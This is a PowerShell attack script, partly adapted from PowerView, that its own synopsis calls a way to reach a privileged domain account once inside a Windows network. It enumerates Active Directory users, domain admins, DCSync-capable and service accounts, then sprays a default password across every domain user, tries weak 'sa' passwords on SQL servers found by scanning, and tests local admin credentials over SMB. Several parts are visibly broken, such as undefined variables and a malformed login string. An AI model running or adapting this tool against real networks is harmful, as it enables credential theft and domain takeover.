<# 
	2. Check if user has administrative privilege on some machine
		a. if so, dump credentials, foreach user GOTO 1
#>

<#
    Author: Itamar Mizrahi (@Zecured)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>


# Taken as is from PowerView project. Big thanks to harmj0y and mattifestation.
# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr]))
)

function New-InMemoryModule
{
<#
    .SYNOPSIS
        Creates an in-memory assembly and module
        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION
        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.
    .PARAMETER ModuleName
        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.
    .EXAMPLE
        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

$Mod = New-InMemoryModule -ModuleName Win32

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

filter Get-NameField {
<#
    .SYNOPSIS
    
        Helper that attempts to extract appropriate field names from
        passed computer objects.
    .PARAMETER Object
        The passed object to extract name fields from.
    .PARAMETER DnsHostName
        
        A DnsHostName to extract through ValueFromPipelineByPropertyName.
    .PARAMETER Name
        
        A Name to extract through ValueFromPipelineByPropertyName.
    .EXAMPLE
        PS C:\> Get-NetComputer -FullData | Get-NameField
#>
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        $Object,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $DnsHostName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )

    if($PSBoundParameters['DnsHostName']) {
        $DnsHostName
    }
    elseif($PSBoundParameters['Name']) {
        $Name
    }
    elseif($Object) {
        if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {
            # objects from Get-NetComputer
            $Object.dnshostname
        }
        elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {
            # objects from Get-NetDomainController
            $Object.name
        }
        else {
            # strings and catch alls
            $Object
        }
    }
    else {
        return $Null
    }
}

filter Get-NetShare {
<#
    .SYNOPSIS
        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"
    .PARAMETER ComputerName
        The hostname to query for shares. Also accepts IP addresses.
    .OUTPUTS
        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share,
        with the ComputerName added.
    .EXAMPLE
        PS C:\> Get-NetShare
        Returns active shares on the local host.
    .EXAMPLE
        PS C:\> Get-NetShare -ComputerName sqlserver
        Returns active shares on the 'sqlserver' host
    .EXAMPLE
        PS C:\> Get-NetComputer | Get-NetShare
        Returns all shares for all computers in the domain.
    .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    # extract the computer name from whatever object was passed on the pipeline
    $Computer = $ComputerName | Get-NameField

    # arguments for NetShareEnum
    $QueryLevel = 1
    $PtrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get the share information
    $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

    # Locate the offset of the initial intPtr
    $Offset = $PtrInfo.ToInt64()

    # 0 = success
    if (($Result -eq 0) -and ($Offset -gt 0)) {

        # Work out how much to increment the pointer by finding out the size of the structure
        $Increment = $SHARE_INFO_1::GetSize()

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            # create a new int ptr at the given offset and cast the pointer as our result structure
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
            $Info = $NewIntPtr -as $SHARE_INFO_1

            # return all the sections of the structure
            $Shares = $Info | Select-Object *
            $Shares | Add-Member Noteproperty 'ComputerName' $Computer
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment
            $Shares
        }

        # free up the result buffer
        $Null = $Netapi32::NetApiBufferFree($PtrInfo)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}

filter Get-NetSession {
<#
    .SYNOPSIS
        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)
    .PARAMETER ComputerName
        The ComputerName to query for active sessions.
    .PARAMETER UserName
        The user name to filter for active sessions.
    .OUTPUTS
        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions, with the ComputerName added.
    .EXAMPLE
        PS C:\> Get-NetSession
        Returns active sessions on the local host.
    .EXAMPLE
        PS C:\> Get-NetSession -ComputerName sqlserver
        Returns active sessions on the 'sqlserver' host.
    .EXAMPLE
        PS C:\> Get-NetDomainController | Get-NetSession
        Returns active sessions on all domain controllers.
    .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [String]
        $UserName = ''
    )

    # extract the computer name from whatever object was passed on the pipeline
    $Computer = $ComputerName | Get-NameField

    # arguments for NetSessionEnum
    $QueryLevel = 10
    $PtrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get session information
    $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

    # Locate the offset of the initial intPtr
    $Offset = $PtrInfo.ToInt64()

    # 0 = success
    if (($Result -eq 0) -and ($Offset -gt 0)) {

        # Work out how much to increment the pointer by finding out the size of the structure
        $Increment = $SESSION_INFO_10::GetSize()

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            # create a new int ptr at the given offset and cast the pointer as our result structure
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
            $Info = $NewIntPtr -as $SESSION_INFO_10

            # return all the sections of the structure
            $Sessions = $Info | Select-Object *
            $Sessions | Add-Member Noteproperty 'ComputerName' $Computer
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment
            $Sessions
        }
        # free up the result buffer
        $Null = $Netapi32::NetApiBufferFree($PtrInfo)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}


Function Autheticate-SQL
{
    <#
    .SYNOPSIS
        This tool provides an easy way, once inside a Windows network, to try and achieve a privileged domain user account.
        Author: Itamar Mizrahi (@Zecured)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION

    .PARAMETER Password
    Password to try and use for domain users
        
    .EXAMPLE 
       
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$True, Position=0, ValueFromPipeline=$True)]
        [String]$ComputerName,
        [parameter(Mandatory=$True, Position=1)]
        [String]$UserName,
        [parameter(Mandatory=$False, Position=2)]
        [String]$Password

    )

    $connection = New-Object -TypeName System.Data.SqlClient.SqlConnection  
    $connectionString =  "Data Source=$ComputerName;Initial Catalog=master;User Id=$UserName;Password=$Password"
    $connection.ConnectionString = $connectionString 
    $command = $connection.CreateCommand()
    $query = "select * from logins"
    $command.CommandText = $query
    try {
        $connection.Open()
        if($connection.State -eq "Open")
        {
            return $True
        }
       }
    catch {
        return $False
    }

    finally{
        $connection.Close()
    }
}

Add-Type -assemblyname System.DirectoryServices.AccountManagement
Function Test-ADAuthentication 
{
    param
    ($Username,$Password)
    (new-object DirectoryServices.Directoryentry "",$Username,$Password).psbase.name -ne $null
}

function Test-Port
{  
<#    
.SYNOPSIS    
    Tests port on computer.  
     
.DESCRIPTION  
    Tests port on computer. 
      
.PARAMETER computer  
    Name of server to test the port connection on.
       
.PARAMETER port  
    Port to test 
        
.PARAMETER tcp  
    Use tcp port 
       
.PARAMETER udp  
    Use udp port  
      
.PARAMETER UDPTimeOut 
    Sets a timeout for UDP port query. (In milliseconds, Default is 1000)  
       
.PARAMETER TCPTimeOut 
    Sets a timeout for TCP port query. (In milliseconds, Default is 1000)
                  
.NOTES    
    Name: Test-Port.ps1  
    Author: Boe Prox  
    DateCreated: 18Aug2010   
    List of Ports: http://www.iana.org/assignments/port-numbers  
       
    To Do:  
        Add capability to run background jobs for each host to shorten the time to scan.         
.LINK    
    https://boeprox.wordpress.org 
      
.EXAMPLE    
    Test-Port -computer 'server' -port 80  
    Checks port 80 on server 'server' to see if it is listening  
     
.EXAMPLE    
    'server' | Test-Port -port 80  
    Checks port 80 on server 'server' to see if it is listening 
       
.EXAMPLE    
    Test-Port -computer @("server1","server2") -port 80  
    Checks port 80 on server1 and server2 to see if it is listening  
     
.EXAMPLE
    Test-Port -comp dc1 -port 17 -udp -UDPtimeout 10000
     
    Server   : dc1
    Port     : 17
    TypePort : UDP
    Open     : True
    Notes    : "My spelling is Wobbly.  It's good spelling but it Wobbles, and the letters
            get in the wrong places." A. A. Milne (1882-1958)
     
    Description
    -----------
    Queries port 17 (qotd) on the UDP port and returns whether port is open or not
        
.EXAMPLE    
    @("server1","server2") | Test-Port -port 80  
    Checks port 80 on server1 and server2 to see if it is listening  
       
.EXAMPLE    
    (Get-Content hosts.txt) | Test-Port -port 80  
    Checks port 80 on servers in host file to see if it is listening 
      
.EXAMPLE    
    Test-Port -computer (Get-Content hosts.txt) -port 80  
    Checks port 80 on servers in host file to see if it is listening 
         
.EXAMPLE    
    Test-Port -computer (Get-Content hosts.txt) -port @(1..59)  
    Checks a range of ports from 1-59 on all servers in the hosts.txt file      
             
#>  
[cmdletbinding(  
    DefaultParameterSetName = '',  
    ConfirmImpact = 'low'  
)]  
    Param(  
        [Parameter(  
            Mandatory = $True,  
            Position = 0,  
            ParameterSetName = '',  
            ValueFromPipeline = $True)]  
            [array]$Computername,  
        [Parameter(  
            Position = 1,  
            Mandatory = $True,  
            ParameterSetName = '')]  
            [array]$Port,  
        [Parameter(  
            Mandatory = $False,  
            ParameterSetName = '')]  
            [int]$TCPtimeout=1000,  
        [Parameter(  
            Mandatory = $False,  
            ParameterSetName = '')]  
            [int]$UDPtimeout=1000,             
        [Parameter(  
            Mandatory = $False,  
            ParameterSetName = '')]  
            [switch]$TCP,  
        [Parameter(  
            Mandatory = $False,  
            ParameterSetName = '')]  
            [switch]$UDP                                    
        )  
    Begin {  
        If (!$tcp -AND !$udp) {$tcp = $True}  
        #Typically you never do this, but in this case I felt it was for the benefit of the function  
        #as any errors will be noted in the output of the report          
        $ErrorActionPreference = "SilentlyContinue"  
        $report = @()  
    }  
    Process {     
        ForEach ($c in $computer) {  
            ForEach ($p in $port) {  
                If ($tcp) {    
                    #Create temporary holder   
                    $temp = "" | Select Server, Port, TypePort, Open, Notes  
                    #Create object for connecting to port on computer  
                    $tcpobject = new-Object system.Net.Sockets.TcpClient  
                    #Connect to remote machine's port                
                    $connect = $tcpobject.BeginConnect($c,$p,$null,$null)  
                    #Configure a timeout before quitting  
                    $wait = $connect.AsyncWaitHandle.WaitOne($TCPtimeout,$false)  
                    #If timeout  
                    If(!$wait) {  
                        #Close connection  
                        $tcpobject.Close()  
                        Write-Verbose "Connection Timeout"  
                        #Build report  
                        $temp.Server = $c  
                        $temp.Port = $p  
                        $temp.TypePort = "TCP"  
                        $temp.Open = "False"  
                        $temp.Notes = "Connection to Port Timed Out"  
                    } Else {  
                        $error.Clear()  
                        $tcpobject.EndConnect($connect) | out-Null  
                        #If error  
                        If($error[0]){  
                            #Begin making error more readable in report  
                            [string]$string = ($error[0].exception).message  
                            $message = (($string.split(":")[1]).replace('"',"")).TrimStart()  
                            $failed = $true  
                        }  
                        #Close connection      
                        $tcpobject.Close()  
                        #If unable to query port to due failure  
                        If($failed){  
                            #Build report  
                            $temp.Server = $c  
                            $temp.Port = $p  
                            $temp.TypePort = "TCP"  
                            $temp.Open = "False"  
                            $temp.Notes = "$message"  
                        } Else{  
                            #Build report  
                            $temp.Server = $c  
                            $temp.Port = $p  
                            $temp.TypePort = "TCP"  
                            $temp.Open = "True"    
                            $temp.Notes = ""  
                        }  
                    }     
                    #Reset failed value  
                    $failed = $Null      
                    #Merge temp array with report              
                    $report += $temp  
                }      
                If ($udp) {  
                    #Create temporary holder   
                    $temp = "" | Select Server, Port, TypePort, Open, Notes                                     
                    #Create object for connecting to port on computer  
                    $udpobject = new-Object system.Net.Sockets.Udpclient
                    #Set a timeout on receiving message 
                    $udpobject.client.ReceiveTimeout = $UDPTimeout 
                    #Connect to remote machine's port                
                    Write-Verbose "Making UDP connection to remote server" 
                    $udpobject.Connect("$c",$p) 
                    #Sends a message to the host to which you have connected. 
                    Write-Verbose "Sending message to remote host" 
                    $a = new-object system.text.asciiencoding 
                    $byte = $a.GetBytes("$(Get-Date)") 
                    [void]$udpobject.Send($byte,$byte.length) 
                    #IPEndPoint object will allow us to read datagrams sent from any source.  
                    Write-Verbose "Creating remote endpoint" 
                    $remoteendpoint = New-Object system.net.ipendpoint([system.net.ipaddress]::Any,0) 
                    Try { 
                        #Blocks until a message returns on this socket from a remote host. 
                        Write-Verbose "Waiting for message return" 
                        $receivebytes = $udpobject.Receive([ref]$remoteendpoint) 
                        [string]$returndata = $a.GetString($receivebytes)
                        If ($returndata) {
                           Write-Verbose "Connection Successful"  
                            #Build report  
                            $temp.Server = $c  
                            $temp.Port = $p  
                            $temp.TypePort = "UDP"  
                            $temp.Open = "True"  
                            $temp.Notes = $returndata   
                            $udpobject.close()   
                        }                       
                    } Catch { 
                        If ($Error[0].ToString() -match "\bRespond after a period of time\b") { 
                            #Close connection  
                            $udpobject.Close()  
                            #Make sure that the host is online and not a false positive that it is open 
                            If (Test-Connection -comp $c -count 1 -quiet) { 
                                Write-Verbose "Connection Open"  
                                #Build report  
                                $temp.Server = $c  
                                $temp.Port = $p  
                                $temp.TypePort = "UDP"  
                                $temp.Open = "True"  
                                $temp.Notes = "" 
                            } Else { 
                                <# 
                                It is possible that the host is not online or that the host is online,  
                                but ICMP is blocked by a firewall and this port is actually open. 
                                #> 
                                Write-Verbose "Host maybe unavailable"  
                                #Build report  
                                $temp.Server = $c  
                                $temp.Port = $p  
                                $temp.TypePort = "UDP"  
                                $temp.Open = "False"  
                                $temp.Notes = "Unable to verify if port is open or if host is unavailable."                                 
                            }                         
                        } ElseIf ($Error[0].ToString() -match "forcibly closed by the remote host" ) { 
                            #Close connection  
                            $udpobject.Close()  
                            Write-Verbose "Connection Timeout"  
                            #Build report  
                            $temp.Server = $c  
                            $temp.Port = $p  
                            $temp.TypePort = "UDP"  
                            $temp.Open = "False"  
                            $temp.Notes = "Connection to Port Timed Out"                         
                        } Else {                      
                            $udpobject.close() 
                        } 
                    }     
                    #Merge temp array with report              
                    $report += $temp 
                }                                  
            }  
        }                  
    }  
    End {  
        #Generate Report  
        $report
    }
}

function Test-LocalCredential
{
<#
    .SYNOPSIS
        Verifies a given password for local user on a remote machine.

        Author: Itamar Mizrahi (@MrAnde7son)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

    .PARAMETER UserName
    User to authenticate.

    .PARAMETER ComputerName
    Remote Computer to authenticate to.

    .PARAMETER Password
    Password to use.

    .EXAMPLE 
        PS C:\> Test-LocalCredential -UserName Administrator -ComputerName MyComputer -Password password
        Returns true if the credential is correct, false otherwise.

#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        [string]$UserName,
        [string]$ComputerName = $env:COMPUTERNAME,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    $net = New-Object -ComObject WScript.Network
    $login = $UserName + "\" + $Password
    try{
        $result = $net.MapNetworkDrive("X:", "\\$ComputerName\c$", $false, $login, $Password)
    }
    catch{}
    if($result -eq 0){
        $net.RemoveNetworkDrive("u:",$true,$true)
        return $true
    }
    else{
    return $false
    }
}

function Start-Hunting
{
<#
    .SYNOPSIS
        This tool provides an easy way, once inside a Windows network, to try and achieve a privileged domain user account.
        Author: Itamar Mizrahi (@Zecured)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION

    .PARAMETER Password
    Common\Default password to use.
        
    .EXAMPLE 
       
#>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$False, Position=0, ValueFromPipeline=$True)]
        [string]$Password = "Password123"

    )

    #$Exclusions = @("SYSTEM","Domain Admins","Enterprise Admins")

    Write-Verbose "Querying the forest for all relevant information..."
    $Users = @()
    $Computers = @()
    $ServiceAccounts = @()
    $DCSyncUsers = @()
    $DomainAdmins = @()
    $ServiceAccounts = @()
    #$ACEs = @()
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | ForEach-Object { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains)
    {
        $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($Domain)
        $DirectorySearcher.PageSize = 10000
        $DirectorySearcher.SearchScope = "Subtree"
        $DirectorySearcher.Filter = "(objectCategory=User)"
        $Users = $DirectorySearcher.FindAll()

        $DirectorySearcher.Filter = "(objectCategory=Computer)"
        $Computers = $DirectorySearcher.FindAll()

        $DSRepAll = $Domain.ObjectSecurity.Access | ? {$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'} | % {$_.identityReference.value} | Select-String -Pattern "BUILTIN|Domain Controllers" -NotMatch 
        foreach ($user in $DSRepAll){
            $DCSyncUsers += $user | ?{$_.samaccountname -match $user.ToString().split("\\")[1] -and $_.adspath -match $user.ToString().split("\\")[0]} 
        }

        $DirectorySearcher.Filter = "(name=Domain Admins)"
        $Admins = $DirectorySearcher.FindAll().Properties.member
        foreach ($admin in $Admins){
            $DomainAdmins += $Users | ? {$_.path -match $admin}
        }


        $DirectorySearcher.Filter = '(&(objectcategory=user)(serviceprincipalname=*))'
        $ServiceAccounts += $DirectorySearcher.FindAll() | ? {$_.Properties.serviceprincipalname -ne "kadmin/changepw"}

        <#$Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $GPOs = $DirectorySearcher.FindAll()
        foreach ($gpo in $GPOs){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
            if ($ACL -ne $null){
                $GpoACL = New-Object psobject
                $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
                $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
                $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
                $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
                $ACEs += $GpoACL
            }

        }#>
    }


    # Tries default password, to achieve inital foothold...
    Write-Verbose "Getting a domain user..."

    # Generates userlist
    $verifiedUsers = @()
    foreach($user in $Users)
    {
        Start-Job -ScriptBlock {
            $domain = $user.UserPrincipalName.Split("@")[1]
            $username = $domain + '\' + $user.SamAccountName 
            if(Test-ADAuthentication -Username $username -Password $Password)
            {
                $verifiedUsers += $user
            }
        } 
    }

        # Searching for MSSQL servers
    Write-Verbose "Searching for SQL servers"
    $sqlServers = @()
    foreach($computer in $AllComputers)
    {
	    if((Test-Port -Computername $computer -Port 1434 -UDP).Open)
	    {
		    $sqlServers += $computer		
	    }
    }
    # Tries weak passwords on "sa" account
    $passwords = @("sa","Password123","") 
    $verifiedSQLUsers = @()

    foreach($server in $sqlServers)
    {
	    foreach($password in $passwords)
	    {
            Start-Job -ScriptBlock {	
                if(Autheticate-SQL -ComputerName $server -UserName "sa" -Password $password)
                {
                    $verifiedSQLUsers += ($server+'\sa')
                }
            }
	    }
    }

    Get-Job | Wait-Job

    # Checks if one of the users' found is a member of a privileged group 
    Write-Verbose "Checking the users' found..."
    $Groups = @("admin","privilege")
    $privilegedUsers = @()
    $verifiedDCSyncUsers = @()
    foreach ($user in $verifiedUsers)
    {
        foreach($group in $Groups)
        {
            if($user.MemberOf -like "*$group*")
            {
                $privilegedUsers += $user
            }
        }
        if($DCSyncUsers -contains $user.samAccountName)
        {
            $verifiedDCSyncUsers += $user
        }
    }


    Write-Verbose "Searching for local user accounts which belogs to Administrators group..."
    $localAccounts = @()
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    foreach ($computer in $AllComputers)
    {
        $comp = $computer.Name
        if((New-Object System.Net.Sockets.TcpClient((Resolve-DnsName $comp).IPAddress,445) -ErrorAction SilentlyContinue -WarningAction SilentlyContinue).Connected)
        {
            $accounts = ([adsi]"WinNT://$comp,Computer").Children | ? {$_.SchemaClassName -eq "User"} | select path
            foreach ($account in $accounts)
            {
                $account = $account.Path
                if(Test-LocalCredential -UserName $account.split("/")[$account.split("/").length - 1] -ComputerName $account.split("/")[$account.split("/").length - 2] -Password $password)
                {
                    $localAccounts += $account
                }
            }
        }
    }


    Write-Verbose "Printing results.."
    ### Prints Users Found ###
    Write-Host "Privileged Users: "
    foreach ($user in $privilegedUsers)
    {
	    Write-Host $user.SamAccountName
    }
    Write-Host "DCSync Users: "
    foreach ($user in $verifiedDCSyncUsers)
    {
	    Write-Host $user.SamAccountName
    }
    Write-Host "SQL Users: "
    foreach ($user in $verifiedSQLUsers)
    {
	    Write-Host $user.SamAccountName
    }

    Write-Host "Local Users: "
    foreach ($user in $localAccounts)
    {
	    Write-Host $user
    }

    Write-Host "Vulnerable Service Accounts: "
    foreach ($user in $ServiceAccounts)
    {
        $user
    }
}

$sessions = @()
foreach ($Computer in $Computers){
    $shares = Get-NetShare $Computer | ? {$_.shi1_netname -ne 'ADMIN$' -and $_.shi1_netname -ne 'C$' -and $_.shi1_netname -ne 'IPC$'}
    if ($shares -ne $null){
        $sessions += Get-NetSession $Computer
    }
}